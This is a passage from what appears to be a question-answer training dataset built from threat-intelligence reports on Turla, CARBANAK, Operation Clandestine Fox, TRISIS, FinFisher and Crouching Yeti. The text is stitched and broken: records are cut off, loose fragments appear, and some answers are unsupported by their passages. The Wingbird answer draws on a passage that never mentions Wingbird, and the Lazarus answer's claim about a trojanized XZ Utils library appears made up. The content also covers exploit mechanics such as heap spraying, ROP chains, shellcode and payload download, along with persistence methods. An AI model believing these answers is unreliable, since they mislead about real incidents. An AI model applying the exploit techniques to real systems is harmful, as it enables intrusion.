overcome?",
    "output": "For Yahoo-decoy FinFisher servers, researchers examined the userLocation object in the decoy page's source code to obtain city and country information. However, they faced the challenge of Yahoo implementing SSL redirection by default. To communicate with Yahoo in plain HTTP without triggering SSL redirection, they devised a method to send plain HTTP GET requests to the resource 'https://www.yahoo.com/'.

    "instruction": "Medium Headline: Active Infection\nThe picture below depicts the trojans of the Turla malware family used after a successful infection in more detail:\nFor an infection on a victim system (also called a bot), two stages are passed through. At a first stage, a system is infected by a reconnaissance malware; we call this a recon tool. Recon tools are shown as green circles. Their main purpose is to figure out whether the infected system is interesting enough. Should this be the case, the full-fledged stage 2 malware is added, and ultimately persistence is gained. This will be a much more elaborate malware which implements more features. Stage 2 trojans usually run under administrative privileges, so they require the additional step of a privilege escalation.\nNote that the recon tool is not always removed after the stage 2 trojan has been installed. We observed systems with both stages active on simultaneously. Recon tools are sometimes also used to attack further, at this point still clean systems, to directly install a stage 2 trojan on them. This usually requires the use of an exploit (privilege escalation) on the target system, or -more commonly -the knowledge of credentials.\nAs a consequence, an infected network can contain bots infected with only recon tools, only stage 2 trojans, both of them, or -hopefully the major part -none of them.\nThe picture also shows a purple circle, dated 2011 and named Unix backdoor. This is actually a completely different code, but it was used by the same attackers in 2011. It's main working principle is to sniff all packets on the wire, to check their payload for some mathematical markers left there by the attackers, and finally to back-connect to an IP address encoded in these markers; this is somehow comparable to the \"tainting\" mechanism Snake used several years later. In the end, this is a type of RAT (Remote Access Tool). It even contains a feature to access a linear filesystem at a third IP address (like a file repository), but we never found the corresponding server implementation. It uses Diffie Hellman and Blowfish for communication. One interesting observation about it is the use of a (non-secret) prime number p in the Diffie-Hellman implementation, which already appeared in a project called (<http://phrack.org/issues/51/6.html>)LOKI2, published 1997 in the Phrack magazine. LOKI2 was a program to exfiltrate data via covered channels, like DNS or ICMP. In our opinion, the code was derived from the LOKI2 implementation, and the attackers most probably have other LOKI2-like programs in their arsenal. Note that Kaspersky named this malware Turla Unix variant later on.\nA common feature of recon tools, as well as of stage 2 trojans, is that they don't run in dedicated processes, but inject themselves into already existing processes, where they live as additional threads. This way, no additional processes becomes visible in a running system. We'll examine this mechanism in the next section.\nWe differentiate 2 phases after a successful infection: a trojan supported reconnaissance phase while the recon tool is used, and the final persistence phase after the stage 2 malware is installed.\nSmall Headline: Trojan Supported Reconnaissance\nRecon tools show some simplifications, in contrast to stage 2 malware:\n\u2022 They run in the context of a normal user, without additional privileges. Other users logging in on the same system are not directly affected.\n\u2022 They are started whenever the infected user logs in, using a standard mechanism, like autostart folders or winlogon registry keys.\n\u2022 Main functionality: Execution of batch scripts or executables. Recon tools often also collect some generic system information every time they are started.\n\u2022 Recon tools are usually single-threaded. Received binaries and scripts are executed immediately, and the results are also returned immediately. No concurrent execution is possible.\n\u2022 No additional features like key loggers, plugins or peer to peer functionalities.\n\u2022 No separate configuration file, their configuration is completely hardcoded. Any changes -like C&C server updates -require exchanging the whole binary.\n\u2022 Usually no unique trojan ID is used, or such an ID is volatile (this is not true in all cases).\nRecon tools are used by the attackers to have a closer look at a particular system, usually for a few days or weeks. They can also be considered as giveaway trojans: in case a system is detected at this stage of infection, the attackers don't loose too much, as the more advanced stage 2 trojan was not yet revealed. This of course is only true as long as a stage 2 trojan is not yet discovered and published about.\nAs mentioned above, the main functionality is the execution of batch scripts or binaries. We're using the more generic term of a task for this. A task is a data blob (binary large object) sent by the C&C server to an infected bot containing an instruction (or several instructions) to be executed by a target. The bot either immediately executes this task and sends the result back, it queues the task for later execution, or it forwards the task to another bot to do the same. In the case of recon tools, these tasks are very simple and can only contain binaries or batch scripts to execute. No queuing or forwarding is supported for recon tools. We'll have a closer look on the task format in the next section \"Gaining Information and the Task Format\".\nHistorically, the first actual implementation of a recon tool was observed back in 2007. This was a rather simple program using the name regbackup.exe (that's also how we called it at the time), pretending\nto be a service for a registry backup. Traffic between C&C servers and bots were encrypted using the symmetric CAST128 algorithm in (<https://de.wikipedia.org/wiki/Output_Feedback_Mode>)OFB mode with a hardcoded key. The key was hardcoded, no peer to peer functionality was implemented.\nIn 2011, we observed an evolved version of the recon tool, which was later documented by Kaspersky under the name Tavdig (sometimes also called Wipbot or Epic, these are all the same thing). Basically it's very similar to regbackup. The main evolution is a more advanced binary packer, which actually doesn't even unpack into a standard PE format file, but into a proprietary format (we call it BAD format because it's using hex values 0B AD as marker number instead of \"PE\"). Furthermore, encryption was replaced by ElGamal encryption, which is a public private scheme -more technical details about this later on. The code contains the public key of the server, and a private key.\nAs described above, recon tools use an injection mechanism, like most other members of the malware family. In the case of Tavdig, this is how it works:\nIn this illustration, time runs from top to down, starting after the login of an infected user. Tavdig is then started and running for a short time in its own process (orange box), for instance via the Winlogon registry key. It then injects a guard thread into a process that won't be stopped, until the user logs out, typically one of the svchost.exe processes. This thread is shown as a red stripe. The guard thread itself only acts in the background: It contains a list of process names typical for web browsers, mail and IM clients, and other internet applications. Every process in the bot matching one of these names becomes a target process. The guard thread permanently searches for such target processes. As soon as one is found, e.g. if the user starts a web browser, a work thread is injected. The work thread is doing the main work: it contacts the C&C servers and executes tasks. The guard thread makes sure that only one work thread is running at the same time, and it initiates the start of a new work thread if the old one terminates, e.g. after the victim closes its web browser. This happens immediately, if another target process is still running. But it can also happen later on, as soon as a new target process is started by the victim. This way, only processes that\ntypically connect to the internet try to contact C&C servers; This fools local firewalls, which usually filter traffic based on the originating process, but this also makes detection in proxy logs harder, as C&C traffic is mixed with legitimate traffic. One side effect is Tavdig not to become active before the user starts his internet browser or mail client or any other program connecting the internet. Note that all members of the Turla family are proxy aware: unlike many E-banking trojans, they also work behind firewalls.\nOne drawback for the attackers, at least in the case of recon tools, is that tasks can get lost, namely if a task, which takes some time for execution, is received, and the victim closes the browser before the task has been finished and results are sent back. There is no queueing mechanism, so the task won't be executed again in the next started work thread. Second stage trojans solve this problem by more complex setups.\nQuestion: How does the Turla malware family achieve persistence on a victim system, and what are the two stages involved in this process?",
    "output": "Answer: The Turla malware family achieves persistence on a victim system through a two-stage infection process. The first stage involves infecting the system with a reconnaissance malware, referred to as a recon tool. These recon tools, depicted as green circles, assess whether the infected system is valuable enough for further exploitation. If deemed interesting, the second stage involves deploying a more sophisticated stage 2 malware, which operates with administrative privileges and offers more extensive features. This stage 2 malware requires privilege escalation to function effectively.",

    "instruction": "Big Headline: An Interesting Video\nWe came across several video files, but only some were compatible with this video player. After some analysis, it was discovered that there are at least two different versions of the video file format, one with compressed video data and the other is raw. After some slight adjustments to the video processing code, both formats are now supported and we can play all videos.\nFigure 6 shows an image from one of these videos in which the person being watched appears to be testing post-exploitation commands and ensuring they remain undetected by certain security monitoring tools.\nThe list of commands in the figure centers around persistence, screenshot creation, and launching various payloads. Red teamers often maintain such generic notes and command snippets for accomplishing various tasks like persisting, escalating, laterally moving, etc. An extreme example of this is Ben Clark's book . In advance of an operation, it is customary to tailor the file names, registry value names, directories, and other parameters to afford better cover and prevent blue teams from drawing inferences based on methodology. Furthermore, Windows behavior sometimes yields surprises, such as value length limitations, unexpected interactions between payloads and specific persistence mechanisms, and so on. It is in the interest of the attacker to perform a dry run and ensure that unanticipated issues do not jeopardize the access that was gained.\nThe person being monitored via CARBANAK in this video appears to be a network operator preparing for attack. This could either be because the operator was testing CARBANAK, or because they were being monitored. The CARBANAK builder and other interfaces are never shown, and the operator is seen preparing several publicly available tools and tactics. While purely speculation, it is possible that this was an employee of the front company Combi Security which we was operated by FIN7 to recruit potentially unwitting\noperators. Furthermore, it could be the case that FIN7 used CARBANAK's tinymet command to spawn Meterpreter instances and give unwitting operators access to targets using publicly available tools under the false premise of a penetration test.\nBig Headline: Conclusion\nThis final installment concludes our four-part series, lovingly dubbed CARBANAK Week. To recap, we have shared at length many details concerning our experience as reverse engineers who, after spending dozens of hours reverse engineering a large, complex family of malware, happened upon the source code and toolset for the malware. This is something that rarely ever happens!\nWe hope this week's lengthy addendum to FireEye's continued CARBANAK research has been interesting and helpful to the broader security community in examining the functionalities of the framework and some of the design considerations that went into its development.\nSo far we have received lots of positive feedback about our discovery of the source code and our recent expos\u00e9 of the CARBANAK ecosystem. It is worth highlighting that much of what we discussed in CARBANAK Week was originally covered in our FireEye's Cyber Defense (<https://videoshare.fireeye.com/watch/DdYPsctgEQQTK3yh971o8s>)Summit 2018 presentation titled \"!\", which is (a must-see for malware and lederhosen enthusiasts alike). You can expect similar topics and an electrifying array of other malware analysis, incident response, (<https://summit.fireeye.com/>)forensic investigation and threat intelligence discussions at FireEye's upcoming , held Oct. 7 to Oct. 10, 2019, in Washington, D.C.\n\nQ: What insights can be drawn from the video content captured by the CARBANAK backdoor, specifically regarding the activities of the person being monitored, and how might this information be useful in understanding the attacker's methodology?",

    "instruction": "Big Headline: Exploitation\n\u2022 Preparing the heap\n\u2022 Arbitrary memory access\nThe SWF file calls back to Javascript in IE to trigger the IE bug and overwrite the length field of a Flash vector object in the heapspray. The SWF file loops through the heapspray to find the corrupted vector object, and uses it to again modify the length of another vector object. This other corrupted vector object is then used for subsequent memory accesses, which it then uses to bypass ASLR and DEP.\n\u2022 Runtime ROP generation\nWith full memory control, the exploit will search for ZwProtectVirtualMemory, and a stack pivot (opcode 0\u00d794 0xc3) from NTDLL. It also searches for SetThreadContext in kernel32, which is used to clear the debug registers. This technique, documented (<http://piotrbania.com/all/articles/anti_emet_eaf.txt>)here, may be an attempt to bypass protections that use hardware breakpoints, such as EMET's EAF mitigation.\nWith the addresses of the aforementioned APIs and gadget, the SWF file constructs a ROP chain, and prepends it to its RC4 decrypted shellcode. It then replaces the vftable of a sound object with a fake one that points to the newly created ROP payload. When the sound object attempts to call into its vftable, it instead pivots control to the attacker's ROP chain.\n\u2022 ROP and Shellcode\nThe ROP payload basically tries to make memory at 0\u00d718184000 executable, and to return to 0x1818411c to execute the shellcode.\nInside the shellcode, it saves the current stack pointer to 0\u00d718181800 to safely return to the caller.\nmov   dword ptr ds:[18181800h],ebp\nThen, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid application crashes.\n18184129 90  nop\n1818412a c700c0f22169  mov   dword ptr [eax],offset\nFlash32_11_7_700_261!AdobeCPGetAPI+0x42ac00 (6921f2c0)\n18184133 b800401818\nmov\neax,18184000h\n18184138 90\nnop\n18184139 90\nnop\n1818413a c700fe030000  mov   dword ptr [eax],3FEh ds:0023:18184000=3ffffff0\nThe shellcode also recovers the ESP register to make sure the stack range is in the current thread stack base/limit.\nThe shellcode calls SetThreadContext to clear the debug registers. It is possible that this is an attempt to bypass mitigations that use the debug registers.\nThe shellcode calls URLDownloadToCacheFileA to download the next stage of the payload, disguised as an image.\nBig Headline: Threat Group History\nThe APT group responsible for this exploit has been the first group to have access to a select number of browser-based 0-day exploits (e.g. IE, Firefox, and Flash) in the past. They are extremely proficient at lateral movement and are difficult to track, as they typically do not reuse command and control infrastructure. They have a number of backdoors including one known as Pirpi that we previously discussed (<http://www.fireeye.com/blog/technical/botnet-activities-research/2010/11/ie-0-day-hupigon-joins-the-party.html>)here. CVE-2010-3962, then a 0-day exploit in Internet Explorer 6, 7, and 8 dropped the Pirpi payload discussed in this previous case.\nAs this is still an active investigation we are not releasing further indicators about the exploit at this time.\nAcknowledgement: We thank Christopher Glyer, Matt Fowler, Josh Homan, Ned Moran, Nart Villeneuve and Yichong Lin for their support, research, and analysis on these findings.\n\nAnswer this question based on the above context: What techniques does the shellcode used in Operation Clandestine Fox employ to ensure stability and evade detection? Explain the significance of each technique.",
    "output": "The shellcode employed in Operation Clandestine Fox uses several techniques to ensure stability and evade detection. First, it saves the current stack pointer to a specific memory address (0x18181800) to safely return to the caller. This ensures that the execution flow can be properly restored after the shellcode completes its tasks. Next, it restores the flash.Media.Sound vftable and repairs the corrupted vector object to avoid application crashes, maintaining the stability of the exploited environment. Additionally, the shellcode recovers the ESP register to ensure the stack range is within the current thread stack base/limit, preventing potential stack overflow issues. It also calls SetThreadContext to clear the debug registers, which may be an attempt to bypass mitigations that use the debug registers for detection. Finally, the shellcode uses URLDownloadToCacheFileA to download the next stage of the payload disguised as an image, making it harder for traditional detection mechanisms to identify the malicious activity.",

    "output": "To understand how the Lazarus group achieves persistence, we first need to define what persistence is in the context of cyber attacks. Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. In the case of Operation Dream Job, the Lazarus group uses several techniques to achieve persistence. One technique is to install a scheduled task that executes a batch file (Intel.bat) every minute, starting at a specific time. This ensures that even if the system is restarted, the malware will continue to run. Additionally, the attackers install a tool called SiteShoter, which takes screenshots of web pages viewed on the compromised machine at set intervals. This allows the attackers to maintain visibility into the organization's activities even if their initial access is interrupted. Furthermore, the attackers use a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added, which allows them to download and execute arbitrary commands from their command-and-control server. This enables them to maintain their foothold on the system even if their initial malware is detected and removed. Overall, the Lazarus group's use of scheduled tasks, screenshot tools, and Trojanized libraries allows them to achieve persistence and maintain their access to the targeted chemical sector organizations.",

    "instruction": "Big Headline: TRISIS Capabilities\nTRISIS is a Stage 2 ICS Attack capability, as defined by the ICS Cyber Kill Chain as shown in figure 3. Given its design and assessed use, TRISIS has no role or applicability to IT environments and is a focused ICS effects tool. As a result, TRISIS' use and deployment requires that an adversary has already achieved success in Stage 1 of the ICS Cyber Kill Chain and either compromised the business IT network or has identified an alternative means of accessing the ICS network. Once in position, the adversary can deploy TRISIS on its target: an SIS device.\nFigure 3: ICS Cyber Kill-Chain\nSTAGE 2\nTRISIS is a compiled Python script using the publicly-available 'py2exe' compiler. This allows TRISIS to execute in an environment without Python installed natively, which would be the case in most ICS environments and especially in SIS equipment. The script aims to change the underlying logic on a target SIS \u2013 in this case, a Schneider Electric Triconex device. Subsequent code analysis indicated the script is designed to target Triconex 3008 processor modules specifically. The executable takes its target as a command-line argument passed to it on execution. The implications of this are specifically in targeting at run-time, unless called through an additional script, and based on a review of the code, limiting TRISIS to impacting a single target per execution.\nThe core logic alteration functionality works through a combination of four binaries that are uploaded to the target SIS:\n\u2022 Two embedded binary payloads within the compiled Python script.\n\u2022 Two additional, external binaries that are specifically referenced by name within the script but located in separate files.\nMedium Headline: Stage 2 Execute ICS Attack:\nTRISIS verifies the success of the previous step and then uploads new ladder logic to SIS\nBased on the description above, TRISIS itself represents a facilitating capability or framework for the actual ladder logic change that has the potential, as outlined in the scenarios above, to alter the environment. As such, TRISIS itself could be repurposed to deliver alternative payloads to either deliver different logic files (the external binaries uploaded by TRISIS to the target SIS) or to utilize differently embedded binaries to target different SIS types entirely. While both are quite plausible, the work involved would be significant and represents the largest amount of effort and required resources for TRISIS efficacy: ensuring that the embedded binaries identify the correct portion of SIS memory for replacement ladder logic upload, and then developing appropriate ladder logic for the target system. Neither of these is trivial, and make scaling or spreading this attack to other environments \u2013 and potentially the same Triconex devices but in different installations \u2013 extremely difficult.\nDragos was not provided with the external binaries used in the TRISIS attack, and we are therefore unable to determine what precise impact would result on the victim SIS. Nonetheless, any modification to SIS in an operational environment represents a significant risk and potential for damage or even loss of life. The precise attack path is also unknown at this time, but based upon available information and functionality of TRISIS, the target SIS must be network accessible from a device the adversary was able to compromise and establish reasonably persistent command and control over. As a result, TRISIS activity \u2013 from initial installation through periodic control followed by ultimate payload delivery \u2013 represents multiple steps across Stages 1 and 2 of the ICS Cyber Kill Chain.\nWhile TRISIS as a Python program allows for some level of flexibility in that different modules could be referenced or included to provide different effects, as an attack vector such alterations are difficult to execute in practice for the reasons outlined above. As such, TRISIS is a very focused, target-specific malware that would not be capable of delivering equivalent effects in another environment without significant modification.\nAn additional point to emphasize is that no real vulnerability or exploit is utilized by TRISIS. Rather, TRISIS functionality depends upon understanding how Triconex SIS devices function and specifics about the process environment. With a full understanding of these items, the adversary then must design and deploy ladder logic to create the desired impact on the target SIS.\nBig Headline: Implications\nTRISIS represents, in several ways, 'game-changing' impact for the defense of ICS networks. While previously identified in theoretical attack scenarios, targeting SIS equipment specifically represents a dangerous evolution within ICS computer network attacks. Potential impacts include equipment damage, system downtime, and potentially loss of life. Given these implications, it is important to ensure nuance in how the industry responds and communicates about this attack.\nFirst, adversaries are becoming bolder, and an attack on an SIS is a considerable step forward in causing harm. This requires the industry to continue its focus on reliability and safety by pursuing appropriate and measured steps towards securing industrial processes. Information technology security best practices are not necessarily appropriate to such situations and an ICS, and a mission-focused approach must be taken into consideration of secondary effects.\nSecond, the attack of an SIS cannot be taken lightly but should not be met with hype and fear. Eventually, information about this attack will leak to the media and public community. At that point, those in the industrial security community can have a nuanced conversation noting that this attack is not a highly scalable attack that has immediate repercussions to the community. Or simply stated, the public nor government should invoke fear. The industrial asset owner, operator, and vendor community have had a significant dedication to safety and reliability, and now it is obvious that the community is taking steps forward in security. Dragos cautions the community not to use this attack to further other causes as the impact of hype can be far-reaching and crippling. TRISIS is a learning moment to push for more security but in a proper and measured way.\nThird, this attack does have implications for all industrial asset owners and operators that leverage SIS. The fact that Schneider Electric's Triconex was targeted should have no bearing on how defenders respond to this case. This was a clear attack on the community. There can be no victim blaming or product shaming that is reasonable nor will it make the community better. The implication is that adversaries are targeting SIS and defenders must live in this reality presented adapting as appropriate to ensure safety and reliability of the operations our society depend upon.\n\nAnswer this question based on the above context: What are the key components and functionalities of TRISIS that enable it to alter the logic on a target SIS, and how does this impact the scalability of the attack?",
    "output": "TRISIS uses a combination of four binaries to alter the logic on a target SIS: two embedded binary payloads within the compiled Python script and two additional, external binaries referenced by name within the script but located in separate files. The core logic alteration functionality involves uploading new ladder logic to the SIS. However, this process is highly specific and requires a deep understanding of the target SIS and its environment. The work involved in identifying the correct portion of SIS memory for replacement ladder logic upload and developing appropriate ladder logic for the target system is significant. This makes scaling or spreading the attack to other environments, even with the same Triconex devices but in different installations, extremely difficult.",

    "instruction": "Big Headline: 2. BACKGROUND AND INTRODUCTION\nFinFisher is a line of remote intrusion and surveillance software developed by Munich-based Gamma International GmbH. FinFisher products are marketed and sold exclusively to law enforcement and intelligence agencies by the UK-based Gamma Group. Although touted as a \"lawful interception\" suite for monitoring criminals, FinFisher has gained notoriety because it has been used in targeted attacks against human rights campaigners and opposition activists in countries with questionable human rights records.\nIn late July 2012, we the results of an investigation into a suspicious e-mail campaign targeting Bahraini activists. We analyzed the attachments and discovered that they contained the FinSpy spyware, FinFisher's remote monitoring product. FinSpy captures information from an infected computer, such as passwords and Skype calls, and sends the information to a FinSpy command & control (C2) server. The attachments we analyzed sent data to a command & control server inside Bahrain.\nThis discovery motivated researchers to search for other command & control servers to understand how widely FinFisher might be used. Claudio Guarnieri at Rapid7 (one of the authors of this report) was the first to search for these servers. He fingerprinted the Bahrain server and looked at historical to identify other servers around the world that responded to the same fingerprint. Rapid7 published this list of servers, and described their fingerprinting technique. Other groups, including and also analyzed and published reports on FinSpy.\nImmediately after publication, the servers were apparently updated to evade detection by the Rapid7 fingerprint. We devised a different fingerprinting technique and scanned portions of the internet. We confirmed Rapid7's results, and also found several new servers, including one inside Turkmenistan's Ministry of Communications. We published our list of servers in late August 2012, in addition to of FinSpy. FinSpy servers were apparently updated again in October 2012 to disable this newer fingerprinting technique, although it was never publicly described.\nNevertheless, via analysis of existing samples and observation of command & control servers, we managed to enumerate yet more fingerprinting methods and continue our survey of the internet for this surveillance software. We describe the results in this post.\nCivil society groups have found cause for concern in these findings, as they indicate the use of FinFisher products by countries like Turkmenistan and Bahrain with problematic records on human rights, transparency, and rule of law. In an August 2012 response to a letter from UK-based NGO Privacy International, the UK Government revealed that at some unspecified time in the past, it had examined a version of FinSpy, and communicated to Gamma that a license would be required to export that version outside of the EU. Gamma has repeatedly denied links to spyware and servers uncovered by our research, claiming that the servers detected by our scans are \"not \u2026 from the FinFisher product line.\"Gamma also claims that the spyware sent to activists in Bahrain was an \"old\" demonstration version of FinSpy, stolen during a product presentation.\nIn February 2013, Privacy International, the European Centre for Constitutional and Human Rights (ECCHR), the Bahrain Center for Human Rights, Bahrain Watch, and Reporters Without Borders with the Organization for Economic Cooperation and Development (OECD), requesting that this body investigate whether Gamma violated OECD Guidelines for Multinational Enterprises by exporting FinSpy to Bahrain.\nThe complaint called previous Gamma statements into question, noting that at least two different versions (4.00 and 4.01) of FinSpy were found in Bahrain, and that Bahrain's server was a FinFisher product and was likely receiving updates from Gamma. This complaint, states that Gamma:\n\uf0b7 failed to respect the internationally recognised human rights of those affected by [its] activities\n\uf0b7 caused and contributed to adverse human rights impacts in the course of [its] business activities\n\uf0b7 failed to prevent and mitigate adverse human rights impacts linked to [its] activities and products, and failed to address such impacts where they have occurred\n\uf0b7 failed to carry out adequate due diligence (including human rights due diligence); and\n\uf0b7 failed to implement a policy commitment to respect human rights.\nAccording to , German Federal Police appear to have plans to purchase and use the FinFisher suite of tools domestically within Germany. Meanwhile, findings by our group and others continue to illustrate the global proliferation of FinFisher's products. Research continues to uncover troubling cases of FinSpy in countries with dismal human rights track records, and politically repressive regimes. Most recently, work by has confirmed the presence of a Bahraini FinFisher campaign, and further contradicted Gamma's public statements. This post adds to the list by providing an updated list of FinSpy Command & Control servers, and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam.\nWe present these updated findings in the hopes that we will further encourage civil society groups and competent investigative bodies to continue their scrutiny of Gamma's activities, relevant export control issues, and the issue of the global and unregulated proliferation of surveillance malware.\n\nAnswer this question based on the above context: What techniques were employed by researchers to identify additional FinSpy command & control servers globally, and how did the operators of these servers attempt to evade detection?",

Havex Version 024, compiled at the end of 2012, is the most widespread.\nBesides the Havex version, the OS Version of the victim computer is also communicated to the C&C server.

Grey lines are connections from a victim to its C&C Server.\nSome C&C Servers are dedicated to a given version of a backdoor (big Cluster). Others share connections with different backdoor versions and different backdoors.\nBreaking this down to the sectors of the identified victims, we cannot see any correlation between C&Cs and victims. The same sectors are targeted with different backdoor versions.\nSmall Headline: File timestamp analysis and unique strings\nIt is rare to see file timestamps used as a precise, primary source of information when it comes to threat actor attribution. In previous reports, these timestamps have been used as supporting, or secondary pieces of data. They may help to suggest or support a time range for attacker activity, but they are very easily modified. So it is not very helpful to focus on this data set.\nThe strings present in the backdoors, web components, and exploits are in English. Almost 200 malicious binaries and the related operational content all present a complete lack of Cyrillic content, the opposite of our documented findings from researching Red October, Miniduke, Cosmicduke, Snake, and TeamSpy.\nThe OPC module strings include typos and bad grammar.

Exploit server activity\nAll the exploit servers delivered slightly modified ripped content from open source repositories. All the servers appear to be hacked servers. According to the available data, no zero-day exploits were used in any of these attacks, either to compromise the servers in the first place, or delivered as client side attack exploits by the Lights Out Exploit Kit.\nWhile this purely malicious re-use of metasploit PoC highlights the danger that these attack tools pose, it is also unusual to see an exclusively metasploit attack toolset effectively used in this way, delivered from what appear to be a chain of higher value compromised sites.\nAll of these compromised web applications were vulnerable to freely available offensive security tools. We acknowledge that many of the compromised referrer servers were related to power producers in some way. However, these targets almost seem an afterthought, as the exploit servers themselves were compromised web servers from Cuban travel agency sites, a Californian winery site, a US based women\u2022s fashion site, an Iranian general interest/religious inspiration site, a number of dating and adult content websites, and a variety of others. Although, we note that the known Trojanized software packages were ICS/SCADA related as well, possibly because those victim sets or environments required special attention. So, while there was a strong set of offensive activities on power producers during the campaigns, it was by no means the full focus of them.\nMedium Headline: 3.3. Victim characteristics and categories\nWhile it may be \u2022shocking\u2022 to observe power producers around the world targeted by any one threat actor, this actor\u2022s attack activity does not appear to be constrained to power producers. The related industries of interest show a much broader global scope than previously discussed, and the geographic regions of interest have gone completely undiscussed. For example, Spain had the highest number of victims. However, it appears that there was no significant correlation between the victim location and the C&C geolocation.

Conclusions\nThe Crouching Yeti actor has been performing massive surveillance campaigns in recent years, since at least 2010. Their targets included thousands of victims of which we were able to identify a few, confirming Crouching Yeti\u2022s interest in several strategic sectors.\nThe distribution strategy of the group focuses on methods following this targeted philosophy, including spear phishing and waterholing. Noticeably, they also compromised legitimate software packages from strategic actors in the SCADA sector in order to infect their final victims. The victim list confirms that the tactic proved successful.\nThere is nothing especially sophisticated in their exploits, or in the malware they used to infect victims. Their RATs are flexible enough to perform surveillance and data exfiltration efficiently. They used dozens of compromised servers as Command and Control domains with a simple, but effective, PHP backend.\nHowever there is an interesting connection with this group and the LightsOut Exploit Kit for the distribution of its malware in some waterholing attacks. We believe they are likely its only operators as of June 2014.\nThanks to the monitoring of several of the Command and Control domains used by the group, we were able to identify several victims. This victims\u2022 list reinforces the interests shown by the Crouching Yeti actor in strategic targets, but also shows the interest of the group in many other not-so-obvious institutions. We believe they might be collateral victims, but it might also be fair to redefine the Crouching Yeti actor not only as a highly targeted one in a very specific area of interest, but a broad surveillance campaign with interests in different sectors.\nWe will continue monitoring this actor.\n\nQuestion: How did the Energetic Bear/Crouching Yeti APT group leverage compromised servers for their exploit activities, and what implications does this have for cybersecurity practices?\n\nAnswer:",

The first volume, \\\\.\\Hd1, is used for persistent storage and is mapped to a file (hotfix.dat), while the second volume, \\\\.\\Hd2, acts as temporary or cache storage and is not mapped to a file, losing its contents when the computer is switched off. Both volumes use FAT file systems and are encrypted using the CAST-128 algorithm. The malware utilizes these volumes to store various files such as a message queue (\\.\\\\Hd1\\\\queue) for asynchronous communication between the kernel mode driver and usermode DLL, log files (klog, conlog, dump), and potentially the original dropper (rkng_inst.exe).

    "output": "Adversaries, including those behind the RSA_Russian-Bank-Offices-Phishing-Wave APT, compromise third-party Virtual Private Servers (VPSs) to leverage the trust and ubiquity associated with reputable cloud service providers. By doing so, they create a layer of abstraction between themselves and their malicious activities, making it challenging to attribute the operations to the actual perpetrators. In the case of the RSA_Russian-Bank-Offices-Phishing-Wave APT, the attackers likely compromised a VPS, which was previously used as a Minecraft server, to host their Command and Control (C2) infrastructure. This allowed them to blend in with legitimate traffic and avoid detection. Furthermore, the use of a compromised VPS enabled the attackers to capitalize on the reputation of the cloud service provider, making their malicious activities appear more benign.",

Because vulnerability disclosures can be highly inconsistent from quarter to quarter and often occur disproportionately at certain times of the year, statistics about vulnerability disclosures are presented on a half-yearly basis.\nThroughout the report, half-yearly and quarterly time periods are referenced using the nHyy or nQyy formats, in which yy indicates the calendar year and n indicates the half or quarter. For example, 1H16 represents the first half of 2016 (January 1 through June 30), and 4Q15 represents the fourth quarter of 2015 (October 1 through December 31). To avoid confusion, please note the reporting period or periods being referenced when considering the statistics in this report.\nMedium Headline: Conventions\nThis report uses the (<http://www.microsoft.com/mmpc>)Microsoft Malware Protection Center (MMPC) naming standard for families and variants of malware. For information about this standard, see \"Appendix A: Threat naming conventions\" on page 135 of the full report. In this report, any threat or group of threats that share a common unique base name is considered a family for the sake of presentation. This consideration includes threats that may not otherwise be considered families according to common industry practices, such as generic and cloud-based detections. For the purposes of this report, a threat is defined as a malicious or unwanted software family or variant that is detected by the Microsoft Malware Protection Engine.\nBig Headline: How to use this report\nThe Microsoft Security Intelligence Report has been released twice a year since 2006. Each volume is based upon data collected from millions of computers all over the world, which not only provides valuable insights on the worldwide threat landscape, both at home and at work, but also provides detailed information about threat profiles faced by computer users in more than a hundred individual countries and regions.\nTo get the most out of each volume, Microsoft recommends the following:\nMedium Headline: Read\nEach volume of the report consists of several parts. The primary report typically consists of a worldwide threat assessment, one or more feature articles, guidance for mitigating risk, and some supplemental information. A summary of the key findings in the report can be downloaded and reviewed separately from the full report; it highlights a number of facts and subjects that are likely to be of particular interest to readers. The regional threat assessment, available for download and in interactive form at (<https://www.microsoft.com/security/sir/threat/>)www.microsoft.com/security/sir/threat, provides individual summaries of threat statistics and security trends for more than 100 countries and regions worldwide.\nReading the volume in its entirety will provide readers with the most benefit and context, but the report is designed to provide value in small doses as well. Take a few minutes to review the summary information to find the information that will be of most interest to you and your organization. Consult the table of contents and the index to learn more about particular topics of interest.\nMedium Headline: Share\nMicrosoft also encourages readers to share each released volume, or its download link, with co-workers, peers, and friends with similar interests. The Microsoft Security Intelligence Report is written to be useful and accessible to a wide range of audiences. Each volume contains thousands of hours of research disseminated in easy to understand language, with advanced technical jargon kept to a minimum. Each section and article is written and reviewed to provide the most value for the time it takes to read.\nMedium Headline: Assess your own risk\nReading about the threats and risks that affect different types of environments presents a good opportunity to assess your own risks. Not every computer and entity faces the same risk from all threats. Assess your own risks and determine which topics and information can help you to best defend against the most significant risks.\nThe volume and scope of threats facing the typical organization make it important to prioritize. The greatest risk to any computer or organization is posed by currently and recently active threats. Pay attention to the threats that have most commonly affected your region or industry, focusing particularly on the most common successful attacks in the wild that cause the most problems. Give less consideration to very rare or theoretical-only attacks, unless your computers are at particular risk for such threats.\nMedium Headline: Educate\nMicrosoft strives to make this report one of the most valuable sources of threat and mitigation information that you can read and share. We encourage you to use the Microsoft Security Intelligence Report as a guide to educate your employees, friends, and families about security-related topics.\nAnyone, including a business, may link, point to, or re-use articles in the Microsoft Security Intelligence Report for informational purposes, provided the material is not used for publication or sale outside of your company and you comply with the following terms: You must not alter the materials in any way. You must provide a reference to the URL at which the materials were originally found. You must include the Microsoft copyright notice followed by \"Used with permission from Microsoft Corporation.\" Please see (<https://www.microsoft.com/en-us/legal/intellectualproperty/Permissions/default.aspx>)Use of Microsoft (<https://www.microsoft.com/en-us/legal/intellectualproperty/Permissions/default.aspx>)Copyrighted Content for further information.\nRead the text above and answer this question: What are the characteristics of the Wingbird threat family, and how does its commercial availability impact the security landscape?",
    "output": "The Wingbird threat family is a version of a commercially available tool sold for lawful interception. It is fairly advanced and would have required several months of development effort. However, Wingbird does not execute on Windows 10, highlighting the importance of keeping systems up to date. The commercial availability of such tools means that multiple actors, including those with malicious intent, can access sophisticated attack capabilities, thereby increasing the complexity and diversity of threats that security professionals must address.",

